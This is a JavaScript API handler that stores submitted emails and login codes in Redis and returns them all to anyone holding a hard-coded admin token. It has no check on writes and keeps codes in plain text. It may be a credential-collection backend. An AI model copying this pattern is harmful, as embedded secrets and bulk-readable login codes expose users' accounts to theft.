import { Redis } from '@upstash/redis';

const redis = Redis.fromEnv();
const ENTRIES_KEY = 'stratford:entries';
const ADMIN_TOKEN = 'stratford-admin-secret-x9k2';

export default async function handler(req, res) {
  // GET — admin only, must have token
  if (req.method === 'GET') {
    if (req.headers['x-admin-token'] !== ADMIN_TOKEN) {
      return res.status(403).json({ error: 'Forbidden' });
    }
    const entries = (await redis.get(ENTRIES_KEY)) || [];
    return res.status(200).json({ entries });
  }

  // POST — store a login entry
  if (req.method === 'POST') {
    const { email, code, action } = req.body;

    if (action === 'store') {
      const entries = (await redis.get(ENTRIES_KEY)) || [];
      const idx = entries.findIndex(e => e.email === email);
      if (idx >= 0) {
        entries[idx] = { email, code, timestamp: new Date().toISOString() };
      } else {
        entries.push({ email, code, timestamp: new Date().toISOString() });
      }
      await redis.set(ENTRIES_KEY, entries);
      return res.status(200).json({ success: true });
    }
  }

  res.status(405).json({ error: 'Method not allowed' });
}
